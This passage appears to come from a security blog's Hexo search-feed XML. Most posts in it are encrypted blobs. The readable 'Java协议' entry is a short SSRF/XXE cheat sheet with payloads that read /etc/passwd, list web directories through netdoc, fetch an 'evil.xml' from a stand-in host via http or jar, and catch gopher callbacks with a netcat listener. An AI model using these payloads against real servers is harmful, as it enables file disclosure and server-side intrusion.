0b3f394add807b18527b172d9fafc9da1e1256d4c94432a9be4bf3f45826ff4c6f63080b87c810e62a17955522271f1ef7a4eee8febbb77d2e800653b0a2ac5aa23d8b529ee51da60b6a6ed4fbe4c61f27ce887ac55d1dcab07c374f48dd35815ef9322fae431debbae7a99ab015bc3e066eb2c59223a1eeb39ce2e1d0c6382e81b7b7ae31e8e7dfcd50389937eda99e437244e92aded93d59c753c5ec77290567184ea536cbb7a81770662f256703fb4e84899fe71da40a0c39094db2b0454373a2431ffc07b8340a5a3755fce079ec8b94b37f175ef270313cf98afcbd1f11e5f43022099e6756111fe7a8fb541a9b5123ac399cfa777e0746366f9502f0812237d68deb8dcbc133c00f6af557efdea9f2ada6a347174e89137ae19199b4801454563ab78d5851e7c36c518931ce4c6de59db2a32f695b308e12d606016462751aa61331e933ac681339ba88f9da62d304da771589116b01c85996616a8bec54e53e31b8f52f5210c97194dccc405fb6bccd5f38764daeda2007f293ba82e7598903d60f1f532f4d1a27c5c545009e2e8ac2362f7379d56ff25852ca500bd49a08602a3233c8d4211bd88b351b74b1cbe0e304ab15a6cbe33a235036985a12fdfa919914ed08034534018ef2c90a830b9dc323b4c436dba7b2236dc4152c28bdb408662bb4ab1058e65a0f3c2782fd527b934a8e6dc89a9bc28777d30b2cfc46d721e7b1bca9e1c50549b8307f7744892a77f713d4c114c88b0b4c6095c41af14655f0472100b1f04b7e929483e38a8c0a566b31c0ab84a2389c72c8267317bfbf41a7b371b688fdae2c4e0f7ad180c307ca2b9f41dee99c51ef5dd569dce6151731708bf81917b20411b4b49fcf5b760d7f94bc48c593d671f9e72b13a3b3467bc50889bb171362e69d8d8891e5732ae4135132a0eee212ad47ed378ebc1f7b02f8f44147d31143bb37872bf029b31afc16b2fc4ec076a15bd921f1caed66ca75d8ef01cf5b1409a248daba491f9e3786231b18d414e162de475520a5a282c07f69ce3e42d71f9208ecfcb7d168beeff3716344882b0378b93d9025bf06bf54e2ccb35a17d545561ab36972cca383dd4d6adce88ec9a81f9aa15b78edaeda04e33a73c12d4da243cdc7e3fff9c67421c472f0d50f530ccf188bd92d07b715ec2a888d2efc8e3fc9fbd8a6ba7b8379aaf556ab81572609586ea33bb69a2ba42cf473ae63e52256032554f658852d2705f80bcc9a2503877f269f69f481f3bb12428dbf95ebcf577347466525f7f58e8f40a5dd3c681d67229c3ed443dcabd19e8509ce0174bd8b2a8ff8320fd3c0a5c04d4c2f3804705331232eb3c25b51202a6209598f27645d46b70249865c6c20018b8891356df2a7427552551b1e0273ca7333e1c26ca3fb1cfcc9d217cbcb51aafcfc88f20ec6ae48755758e179f93477c93f1d98fbf66b4389864043a6f4984f929909b913eb6258b5823a20ce300bd5155395fe00b4cfc8e9bdd8e3f87abac05d6dab5b876c3bbd6bcb4e577f91427c4d4c5a0332cbe60182a525ef5ac1cc2e30d37758e2a9464c96199b03821f04316e24d0ef8b53d7cf26d75e1d377868fc6dfd426258dc784b1e440151036027b32112349591cbff9727b0c8ff56fce9a7c29b166377b40b84e3f20fc981c3f33ff390026f6fc74758687ebcd219e59f7ecb6525664087899b280cf68c73a2757aad51d8b422019e1b8d1833000a3c47db56f25ce5b6927dd5bdcee27f5b7005f0a97f9ca27068fb2ec29a26837c722e085f1b8a3664c5c11bb4f9a491b5816e1bfde706d500f76506395b0b32b6f45fc00b3d840034d3583d000a11d42e28264c4236097393c91051f5ef6389d3ddd7e0f8551aa785f0c7908cbf59abc2438076ef7d4de48ce82e1252124838dfee29cbe3fd5c3f5704c17da5a43601c1a4e4e1b3d7f47345829946dc81f82cbef325c79378a52a3a0703f9a1c0999ea3eeefa00c42b5b88c68f2b1fc8af452a9977504d8bc18d864a9a486dda57f54a50edf69603cc409ed26bbba7d4547dd0c52cbad6aee9ea85ed65d90d8dc0195c69279598735d4c8d53d4d7ab46cc89a194a973d6984b92e22aa4f50c23c8a6fdc0436cb24931451fde7eb1d1dd824f84773f92b136e1dfc25e35d82196755cd7af67d353b4891b46e6659dcd891d51ed9392d4903b2f2a7fe608f4b7a2fc3cf717ebe55fdd15392a663fa4f3a4b370928c5428e60489d5120b81608e9e7c85a2c2f02ff37688296e54dd2d92b46bb8c3231a6948deca332db36cf6b16933f2b040b672988362752f486b05612be686631344fb54d2cdaa97532e6428f8ded26aa0fe504af31b75b44701d48b89abd1861498a939a1e714af4af1636688af9a42ce54e62ab8e0ad7def03434c3805481870958aa01fd24b9ec92e4c133b544ad343a9b15bdfd2b8069c438f626b46924a72807a583eee7c7f0b831897f518ce7a0657d558687e27bcb53a0a0134f534f6a2cfbaa6699aa67154d043812a261b19b72a092eeb40d828af1294946108da06854f37a85cba1218b51190418266aa37359a5bdc78cd8d44e738e1daf38fca0184327c250140e6426cc4fd894c2b2c2173a0df617ce547a1d8353066b21a74f206d07252c97cf63e691b1483eafe7ef9300d5e3fa4989fe91a874d91ef7f7f526870af9a225b9ac004898c339103620747bf3f77612d335d11d3296d11d874e8fcc725ce0fe6e10dd2d9768e2b224d613d76cd108348badf33614e83af66917ae92c8baad642a8171b31311439661d5bea20bb073200397fe606c3f1d188cd2e634e931b9116257a32032a94885d41af531ddbd09be9a71ae0ba1770bec25dd9615733a7fff696dd348ac36f3b7352e7a3658c0fdf4600cea3ae67068cb5de72884a439a971402c5f3470cba3b90ba98191807cc16605de3a502d88bd2fc3f864d8a2f51459e75cc4ba37b4585d021cda2f18859a09f27771fea88635d2f5ea57d9fd2a574b0dadfd2c62a583ae3c7680fa3b23e07f391bb4776da99ad8390945c8190e2700fa4ae9ab33157c3cc7ce641aa5600a58a1496bf3cf706f32456c58339d781f9f902151a0d765cd50b96b80ddb332646f35a74440c7128afb2e012fb73465bc4a99f6cfdffc6f45f43dab3e3e4e7040ed1206385440ab1a59df3f7b157225ffead02cc05d8c7fa49697873c4ab9dfc1bfae2e862595d2e8f5b0dfbd94c3d5601368829992d386dceb1e2347c9fde6bc55315d6a5e49875868e9d362bceef60b15f55e2cdff6bb47b5e89f24c507e31e59b9e038b280ffaa32b2baabb28a5c539f1eceed5f4339909739f26ad3ba60d021c409232ba4c654cce39f8dd585ca69bcce15529b6aa2c6e6c365a60135a7bd0032f01417031197023e2ce80815a847e3fe300f032f9a1351a1a57ca4a9fc0113db687e0eb3490689cb103f5892d1d8b0bdc11d6309187e22a5abeab546c87e79bc599156bfb0d7c8598c940e8dd9f847460fe5c0025156470f2d0ceebbe9547af3a6bd41fd66c2414e4a3c11a7d730e981d6686706b0c31dedbd8039ccc85dad01b7366e68faf9fce354d0ee2b4d1d86a184530f9c37557c02a5820a13f88affe83deec1985266f566d4315e4a7119c94a05ab98164d4a311d52ed5a882f98a3a2ac6e2f019217fb139536488ca18b588d51fff9c04d1a8d3e57d21571f849ebce48e6448287735fb36d98b98cbc295607d96502c4d01dec15bab6f02812b1507d440c63e1750b00ae5c1d4e25c6aa3a7eccaba59df013db8d0865a2374c683f5ec7c05e8de271b631191e409cab781aaa06cdac39c911b8739f60219d8f37183f91951a7cb4be64e13e3c6563f94d279c8ce1f6359cbdb68a9ea156cd60e28416bd886f3d7fedbeedae6aefd7a8a39245d98dd0d771108e62402e077da1ad17af2cd73d976b1e1dc2dddfc9953fe5ee026704b265ca94fdece08a12fed5af22cd3181e9e9555edc2244ca29c5f9dd7f0ad683ad6f49e965c804cc823f95157c0802f1385ea0250a4306847f58fd802295fb7a894ee52842301316e44a8c4bd1fb0a4a2d791269023dd4813465c2a748b2660a888e86e066a0e5c42a9cdfe7e9a82b38d9735c0a162ba2649dad01b8341d694958fc1b34271871ee295856b896e55c0d8df93486c385ae9e1f27f127f07d8cf6739d059dbd53cfd88d65a981c722b2c92d4f5483c4390e55b8b95261eae4b8d6534c5d7e45e4dae3ce39cad9c360b6342d4f98b31369f3c40318f543083432724da297117a315e023d6e8c3458d8e52c073f8b88e5d8441dfb6cc109f79ca89755f224561985229322b99d69a466697f90781c9e377ff0c6a6b10ca99bda24c1ef86cf28f20829cbaeef69d46cf51a84eed180d0c48d792eb6cb76811254a87e05623773fbf7732a837cfffd051787e3f5182ccd2e6e5367e50c952573c864c61c0a20abfa8e6e9423f1594589052be9b9af837e1444770492255eccd6bdadaab38a5e959727176bfab403056870daf36e792d4ae832f137a38adb5989550d86f54db675d4d99f821db12d5717dc0a3ecca27e875ac5503830c24a533ee8722fde017ef06de21f4f0b3b989574fb175e034c0eb3adb563fa27123e685fae73964b932e6bc83789c272c6df0c33e5fd32c08a2d716e554b3d13f8bb2eb2a67a5739c51eb034dba8e7bfef9fb67474a9a166b4c5f6c4cddcd1567d1b02226eb3bda07bd940c99be086a2a66460347d2ffeb74e5083f3713762bc8422fbb4a97a7553bc5be5ef867f6c01214b3ee4a8e4a08276871643f622b1b9a518690c74ecb5d39929973833309e878354f3d88ed3af7b2d40c09365fa08db2e419b9074c470e5666e5e6dbd3deac541863f13f185575a1e28a578ef8718527c46d561c8cac8cba00f36474d263c0e83df2baae5cc87417b2d9cde9eb2022d977ae4e1d2e73e8169a4e39f051e018890bc7dfe9dee14cacd0eebb2d6d48450611362fafe533205a1409718f38ae2a6f546f73ed2acf3de71d7bb3361c2c88c62b4c5d08f97fba9a0551a2f87bf9e14716f2ce7a1b6eacfcbf68f574138e00adee86962fe8014b1a8e68f300a581f69bfbb5ec4d47ca609eb49fd4f12842b6a61a336851483c653b1348ace04ff0a3de833dfcb121a3d8ad9853482469f33e7436cb424bf6b60a8930ed4e770f7d39b689503f6035d0c113f0b0630f54b95df0e9c60650776368b6032235716f573c0cefbc0cf89b033d146935c73aa8ad7fd60b53f773f0865ff4674d037f51cb3da7c423f945de91a312fbe6137e072ebf3aa09d68112c3323c962546f5205b1716974e7ab50c6faf572624ea4dcd5cdd2b2948193bf716a8e5cc8757f1014547e4a0ba608432220895c17e099352a4e868267025f91cde32b3678e0b4ddb0ae783e8f2aa7de9a94f2181ecd837ecefa21f97bb09b61756a40fc2a0fede80da547a79258a5edd993c3d8bfcb401dabe4e5045d314cfd1b94c7d81137eac2dbdac51d86fccec8032ff791063bfe8c227bdb021eeb9b0a5be2a9d8defe30bec724ba090f9120e649ab53ebe78a61ee0716959d8ca5511e4ef65d26cd170c6ef9ee46163c8ecbcaae66b7bc9fab16987ac9cafc349b7c65aad25c8e293583d98e986e93989ba5fca6913111920ff3cc75887a45276f15ce13b15f0e19154ac31b2b6768adec95929977344ecbf0977897be7b3bf1f39be775df3a5d91011fcaa819c7add8dd2ca355617c23b299a4138d5fb000dd3678200f50d1c7110d5e6ea6942777546254b999e52a8510a0e04c52eaa1ba717b4d630b5be744ac6e914f08c10306b2191bea6b2394bf6d13d687387b2295dae8a499f7eb8eea5004d60aa8c5681d4122af1d4eb19e68455659b6a1bab5a58db7c90b1b6148262a96c27ebd85a8b3b0bd2a033ea6545f99fbd7f95320386be030238fc762ea8733b0004fbbb133433ba07e936f0e9c12f8c3c936338f6b151bf5154e1e10d7a13fe374b646c96b80ea0ff7fa9fd8ba9eacf42d0ebb12b9f1b7b0af1f5372b5dce88c6c194f047f7c8a7c7f9a30b5966370412d3f427353b2938026173b138d33b1893900eda816c2aa2889ae42ca2ed23934255456ee7d41058af356aa161017f56aa8c8e036166bdee9df799e84b2d55e55bcd635396acd0b82490646d5aad6860387f9e5a74f312f38df55fd658671a33c555cf1e11f21f19c86d5271a485f9b8f51467997844ada16851f775a6d1c82bf4518c42c125491cf97b8036612dbd886891ace51ad2449d7d6d112b26df745b611d3ea8a3c0dc6a425aa379ce0d424d5cf9e6d8b4499fa5d182a18d1138d5fa4b0a80493021e21d86068365e5246f36b0b4407b938ccadb1e0b2e20cf6f5222f3cdc47f5487fabddd447a6f302f666163258fd86292a806f110769861e8b35d4d784809de46d5686af61065d6711c6c1a13a3a36dcf9727c03152231a31147b64a885567c3a2fcd8f04f1739d654022782b02cc82ab99b4569136efdc9746a42f961c55ab66ee3cf4da59cc8dcef2437df4471d6a894c3db27d9f53f47bd286e5a427352eafacd486e014aaaa9eb30c1ef74192eccaf61fd20186a5a1ca502d095b55fe05b1ba4498931f9e33b27845dbdfbf2b96f5dbe32ba42a31aa76673ce39ff38c76d961c6fa5d19fa6c7f2385b4af55f9657d26df1cf5c026ea0b20514ec1e80ccdaeb65c20acb934fc3a3b0347b58d5883bfaf643521b1ec6c7a258c52df49cb0e99625cbe71baef8575e0593299b1dcd55cc5817070b7b01a5ba38fa11701c18fe129f5b3b5db4539d44ffcf4bdbdef56578b48a1e2e4b8c0ae829e4189fd86e3a7b6eb56ad697b4bc851dccb8c65b14c06b15b5c10695e83836730d46108624bc7b81eb3beb1f82276221475735d3f22425e494d53e5aa31c63e7b4073a7afb5eb79497575737da8a9cbba08d72147bdcd131ee7cee6c850c2f3a6ccab87809bb3def20e7cce0918e21073ef068bdd2ac94ccb9043d89e5a8e84d51c249fcfbdec51f8bfcc2ce41336140db961ca6b506a1189acdd34d1e54139a4b36e8eda6b792aadeb5959c02bf6708ddfa58372f02bdfed485f4b90a1f7d4a559f3c8c27eebfd6df67732f6e168925fb07ac2b3187cdfb23f4178411212116dcd7d3ee041a5fe19b0e651049940c6e59ba40aae4cd99e6e387b271dbf9ea2120a7d7ee9e7a9658fced6e5d5bbe2edb4d900d0adbc8e78f00b5760f007ef0fb15f3af6475ba168d5906b8f7da60e95d5937b983c3267f47d8ed70716f7c8ef7456108141c82fe33ed0efed678d49781d227ccd1a69966d7b7d48a7d33ada939e51e8a0ea57ba15933d1e95ba23b94ac63a18c2a6e478e6543ebc6848d3cc21c973527772dd6f2a5876c82cacd211cbfd3060a34509681cfff97fd65740588013e96924904269a690689f2c83991d164bb6982f78a20534bfd2ee57f466b86b2cf63e37073e412344115da3684071c645c00df41343c8378e3ed1ece5415581b1b7f4840b4a1d2cbd37cf40caa8eff9526dc6c4ff52bcf8eafb5b85346525d027615ed03fe6db88d49cc1fe63b48115423e5c5d462c64001cc113cbfbf104e76806a24057e18cdc72a359bea727118a32ee62de61f4eefc9a1bcc9582e08ec364af35b11f5f834b6538f491f46520dc7490f516a2f7b84fa34c7401970356cea23b1d0ca1805f6b472376b0c0df24276dbd2d4269a252b7abcfe3b38f081262f8492d3d18767a1d8e745bc9a770fba909ec233508395e49851589170236cf273b41fbe674a79ddf7a8337258b8d8aaff9880be8b235a1ae5c51aff76c6b162d821213117b9c885018d480ddece2fd291aba16f9222f02196debf012f80245f8c135d40121ab176f2cfc934b955a8588f6a97ea55eff2f904af6c4ba295ad19e0e6b0717dfca9610d6f401e3692a6dd49ed9749efe395edd79cf903e083224476a46d8b46a342d9efe65732e2fa25d12b8d72160e2674cbc4567be7b4f9773449ec621bc5308ec422186fc546be30b1ac58c8cb26aaedeed648bfc703fc594e97b8a9269746b29bccd9474cdf35d90d9e51ca6b2758b7e90ec6c198c436b2046e393a7edd156a8205198f954076ab95ceaa0987d6516796b94d02f5fe185a7c98b6eb15a95efcab2b17899158d7012993546b3f7bc24444d497a70922a1fed404f109592207ebdf274f6808fff938c46da359fcd5019bcd074d43a04f7acca9d5af6b4410e04da901ead6e69cafc7bdc368ab286c34348a1cd7177bff6bf0e7a002011fce6eebcb34c4d72cc16f0ae5a5ebfa8e9efd605a487e033cff326cb5286671fbbd058a0646d4fe04dd58f1854d0a4b1171e01f511ac3a805a903f8bcc74c639686dc8a44208830968872731d1752b0eaaea397e1cfd206d6f524cbac1ea3c3aa32da6557eb849362662965a95092144a5a1fa3dabdcebad0fcf19cd58c921ee787f6a7f5032a90218c1ce29acc6ac5471d43219a0aa55871f8d1a6a04a763cda1711b21fcd782759dc45de1f94945c14844af47626ead7f97b9c59e69b5c9de5a5932ff87bafe4728494dd8834d487e7d33ffd7db7d982244d5360e943c2571df37c93c60a378bee9767ae0f49304e85a0532e31f7223550d6838d6113b2da1da40df3211eb78636d363fa4f729f87b389260b35b87abfadfc6d7a1808d10300bfe2cd92328aa1db705eb06679240489224cecd9f3643a3c96ab2f90f91b5981e8aa1e935f827b003ee4f53bef2898e015d2b8b208bede5321f3b91a519e3419a78342c996d19258727197b4819f847dcf444d53aa546c45e2ae13668d6d0d84091f1e5d4a06e73e2535b3f0231a43e8a66c436e46d9c2cf5d77a22892a1f22b965bdc694d159b3a95b53ed0bd80366a3e832af0746466fdf924c917bd12e14aa72e69ee8767ec8fba3ca3cef4c7bb677474dd967fd6f99fc7d02b5696ac50a98b1b6086a8192341b50c347e017d9d7f153565b69a3a3c4048bf0041233381f6e6048413febe2f302fca27816b8922cb9f29c52498f9b66f552c57142c9244284d9626350a16bbcf093a55b571e66704ea6d2a3476f98d5a5b17084598f9f715674f69f6d513c604fae5335df1954cf91e33e3d4c0b53668e26a86859e989a0542306bdb51efd733ec5266563f3a7ee030add8deddb9afbe4238acf0306cc7c552acc4c8ad4cac71a56555628eda7ba4351b4e550e2342715c4b9cbc0c3b817282da33a216c41bb02754ab4e0a6089eef22a72f8d0feb03c78f5af037450d2d3e799d54dee6ba0f04fc80086e205a3250771961c40d839f4d9c05a820c0b87c7ce200cb8b0d0dd8c43232172688a223a8d3dca6bcd5de3708c330e980ba47cff84c687e3e86969e5a77ad72a08d1df53a9ab4543a3acd977b71f5d102611b7acd5bb7043bd6ac0bf21a919b5379bf9f746982d5e682adec568fd94560b663c6b622fdf6769a5699e04b64aed89e9a32e8f5e1b088c8e5808d960cca06e3d5cb19f093585b504df72857a9709121149a95bfb6b8d58d5e8f5c41e765fab07c0497fcbcad05d00eb5fce95159a338b9ce6e0c02a310dcdbc8dfbf48137bd5ee3c26d75cb0e3baacee5d7ab38948e7e4a9691445c7b751492f8708469ae04882751509f1cbfb09783c788edf9e7b88c13bc2464502e6d6833375e71f717a59011f18d260711c52d630c914dc98e6d5fb7cff9e98ce78be78e111a46a4c18a245eea1d6ad8fdad0b4a4c5770205fc60b88b636f65798ddea6c1b3d7eda4a5ad439705e64257f2696e999394cfeb7cb73f728368622934ed3b3d74cc38d4f741894d8a26c8783b4a640d6a51c1c167c0a5ca998f99e39646f73b35d76bb7b9fd361254780b362937a82bf9d9bae682e7d1b4c46bfde9e3ef17a36c22e5492</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Java security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞银行赏金之路</title>
      <link href="/2021/01/21/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8C%E8%B5%8F%E9%87%91%E4%B9%8B%E8%B7%AF/"/>
      <url>/2021/01/21/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8C%E8%B5%8F%E9%87%91%E4%B9%8B%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="577e217b54244da0e3ebd6dd129db509ac83619bb447c6cb0840406393ea0d45">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f722847be14227be29c7db769c5cb47ad0d2a1203cfe659615bdeaefc4c608ce3df8bd50f7441efb571f33f083aafaa7f7d1eebbb9bcba7516a66789c5c43acce27808da16cbd9057c910963fffc982aea60936a79fe42a2064c895fad30d4160df552636133b5a18584b6da8421c95fa0</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 赏金猎人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bypass免杀思路</title>
      <link href="/2020/11/21/bypass%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF/"/>
      <url>/2020/11/21/bypass%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d0a191af1b7e03021b83ea99adf5292c2dded0e2309a4dcfb267905eb2e4acfb">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f757271aa16897c7099e6ee5eef185c941447a457f1d7b7fcb3103200b2ac755270ee0db829abb4a8b6848c5ec5362b69bd51873edaea89bbf0aec0b70eaad845fd395310bc6f89adbaaf9257945358bd0a4f16cc42b21908b61f615bb52d4ca389c7c8c94814383ffbb94ce2b930abe18afe444021bc12e90d1be03be234473e3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C/C++那些事</title>
      <link href="/2020/11/21/C-C-%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
      <url>/2020/11/21/C-C-%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e8ef5867d3b7ad9c75265b88e9418efc7baec4c28c837822d59bb31ad15a5fa2">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f79a71df5748529ff7cc8abd333e6ae39f56aaa593bf8d8d93a6958a0c64b3408aee9f12e38e653f2af45c2f20d343930453ea906463e1ee5db22ba8dd8bcd53203969a29510d292597d87e0b0294d7866d320b401ae7727f8f2e905ab5b255dba</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Butterfly主题美化日记</title>
      <link href="/2020/10/27/test%E7%BE%8E%E5%8C%96%E6%97%A5%E5%BF%97/"/>
      <url>/2020/10/27/test%E7%BE%8E%E5%8C%96%E6%97%A5%E5%BF%97/</url>
      
        <content type="html"><![CDATA[<h1 id="测试一下Butterfly主题美化"><a href="#测试一下Butterfly主题美化" class="headerlink" title="测试一下Butterfly主题美化"></a>测试一下Butterfly主题美化</h1><ul><li>君子和而不同，穷则独善其身，达则兼济天下</li><li>君不见黄河之水天上来，奔流到海不复回</li><li>有朋自远方来，不亦乐乎</li><li>敏而好学，不耻下问</li><li>路漫漫其修远兮，吾将上下而求索</li></ul><h2 id="引用结束："><a href="#引用结束：" class="headerlink" title="引用结束："></a>引用结束：</h2>]]></content>
      
      
      <categories>
          
          <category> Butterfly主题美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Butterfly主题美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Web Servlet教程</title>
      <link href="/2020/01/16/Java-Web-Servlet%E6%95%99%E7%A8%8B/"/>
      <url>/2020/01/16/Java-Web-Servlet%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="31b5bf6b3d0f8c163e45190cad4958846db04bb2268f78c0cdc5c11625b4d7e8">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f7e3d725bc40ba2620ebb628e6bf489261e551f73d6088cdb4601819865828490d30690b0679cd558fe656d468fd25ae5fb696ccd78adde1b00fb9ca0dc824c3f944e38de7fbab71f323e47bac284c573b64c7bf9edafa1319da44a8baabbffcf3225f21b5f5bc5325093c8c7de9e00464d80a9b5e67d5bec237b1e0984d580682fa32d11e3a1f0191edbcabfa637de6360335c8de628ca1e7a85faa980d03c546651bdef4fc1a84fa1261dcfce5947231</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> JavaWeb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用魔法打败魔法</title>
      <link href="/2019/11/21/%E4%BD%BF%E7%94%A8%E9%AD%94%E6%B3%95%E6%89%93%E8%B4%A5%E9%AD%94%E6%B3%95/"/>
      <url>/2019/11/21/%E4%BD%BF%E7%94%A8%E9%AD%94%E6%B3%95%E6%89%93%E8%B4%A5%E9%AD%94%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d2a5e49b2aee3d023454ccb2173c60da7ffa205b5db7822e8b92eaa5c0c16caf">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f70ed377555fc79c6b7c46ea7d4abba8ce8e115bafe122509f0900d83dd4c4909a45e23fd2fd1c15f6c46505ec979ba42b6470ff617392429291550dff707f7c3ad5215f7e807dd5616be68277f1a1f47e4b3f7fc29c1c3d299ac591471f0e1d743f10c6aaf6806e067941b4bbf33d4f761353d0b5bdc150cc9a145a036a438620865e64b78e288adb90da3c3030a8a8134ffdc4cf886a307e53d73755f649d9b32c997339808f90ebcc2840574567d310</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 科学上网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java协议</title>
      <link href="/2019/11/10/java%E5%8D%8F%E8%AE%AE/"/>
      <url>/2019/11/10/java%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="java协议"><a href="#java协议" class="headerlink" title="java协议"></a>java协议</h2><p>JAVA默认提供了对file,ftp,gopher,http,https,jar,mailto,netdoc协议的支持。</p><h3 id="file-ssrf、xxe-："><a href="#file-ssrf、xxe-：" class="headerlink" title="file(ssrf、xxe)："></a>file(ssrf、xxe)：</h3><p> file:///etc/passwd</p><h3 id="netdoc-ssrf、xxe-："><a href="#netdoc-ssrf、xxe-：" class="headerlink" title="netdoc(ssrf、xxe)："></a>netdoc(ssrf、xxe)：</h3><p>知道文件名和文件路径，很简单我们只要知道文件路径然后利用我们的 netdoc 去列目录就能知道文件名了<br>netdoc:///var/www/html/<br>不常见</p><blockquote><p>ps:过滤了file、gopher可使用netdoc代替</p></blockquote><h3 id="jar-ssrf、xxe"><a href="#jar-ssrf、xxe" class="headerlink" title="jar(ssrf、xxe):"></a>jar(ssrf、xxe):</h3><p>jar:<a href="http://localhost:9999/jar.zip!/1.php">http://localhost:9999/jar.zip!/1.php</a></p><h3 id="http-ssrf、xxe"><a href="#http-ssrf、xxe" class="headerlink" title="http(ssrf、xxe):"></a>http(ssrf、xxe):</h3><p><a href="http://url/file.ext">http://url/file.ext</a><br><a href="http://example.com/evil.xml">http://example.com/evil.xml</a></p><h3 id="gopher-ssrf、xxe"><a href="#gopher-ssrf、xxe" class="headerlink" title="gopher(ssrf、xxe):"></a>gopher(ssrf、xxe):</h3><p>gopher://ip:port/xxx</p><blockquote><p>监听：nc -vv -l -p port</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>博客搭建</title>
      <link href="/2019/09/10/Hexo+GitHub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99/"/>
      <url>/2019/09/10/Hexo+GitHub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99/</url>
      
